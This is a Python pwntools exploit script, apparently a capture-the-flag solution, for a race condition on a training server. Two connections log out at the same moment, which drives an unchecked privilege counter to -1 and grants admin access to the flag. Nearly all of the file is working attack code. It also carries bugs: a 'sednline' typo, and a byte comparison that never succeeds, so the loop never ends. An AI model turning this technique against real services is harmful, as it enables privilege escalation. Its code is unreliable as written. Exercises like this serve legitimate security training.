from pwn import *

# Log in and out user or admin account. We only know the user password, and the admin one is the flag. Logging out decreases by one the privilege level (1 is user, 2 is admin) but it does not check that the privilege level is always >=0, so you can log in twice as user (with two different threads) and then logout with both symultaneously, thus making the privilege level go to -1, which is considered as admin (default branch of switch).

def get_token(c) :
    c.recvuntil(b"token: ")
    return c.recvline().strip()

def login(c) :
    c.recvuntil(b"> ")
    c.sendline(b'1')
    c.recvuntil(b"username: ")
    c.sendline(b"user")
    c.recvuntil(b"password: ")
    c.sendline(b"supersecurepassword")

def logout(c) :
    c.recvuntil(b"> ")
    c.sednline(b'2')
    c.recvuntil(b"successful\n")

def get_flag(c) :
    c.recvuntil(b"> ")
    c.sendline(b'4')
    c.recvline()
    return c.recvline().strip()

c_token = remote("underprivileged.training.offensivedefensive.it", 8080, ssl = True)
token = get_token(c_token)
c_token.close()
print(token)

c1 = remote("private.training.offensivedefensive.it", 8080, ssl = True)
c1.recvuntil(b"Token: ")
c1.sendline(token)
c2 = remote("private.training.offensivedefensive.it", 8080, ssl = True)
c2.recvuntil(b"Token: ")
c2.sendline(token)

# This way it doesn't work because the exploit is not synchronized: we have to wait for both the threads to align
# login(c1)
# logout(c1)
# logout(c2)

while (1) :
    login(c1)
    c1.recvuntil(b"> ")
    c2.recvuntil(b"> ")
    c1.sendline(b'2')
    c2.sendline(b'2')
    flag = get_flag(c1)
    print(f"Flag: {flag}")

    if (flag[0] == b'f') :
        break